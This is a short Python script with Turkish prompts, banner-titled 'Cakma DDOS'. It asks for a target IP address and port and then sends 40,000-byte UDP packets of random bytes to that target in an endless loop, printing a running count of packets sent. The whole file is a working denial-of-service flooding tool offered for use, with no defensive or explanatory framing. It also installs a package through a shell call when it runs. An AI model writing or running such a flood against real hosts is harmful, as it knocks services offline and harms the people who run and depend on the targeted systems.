import os
import random 
import socket

os.system ('clear')
os.system ('pkg install figlet')
os.system ('clear')
os.system ('figlet Cakma DDOS')

print ("40.000 byte")


ddos = input("Başlatmak İçin Enter > ")
if(ddos==""):
		
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))

		bytes = random._urandom(40000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))
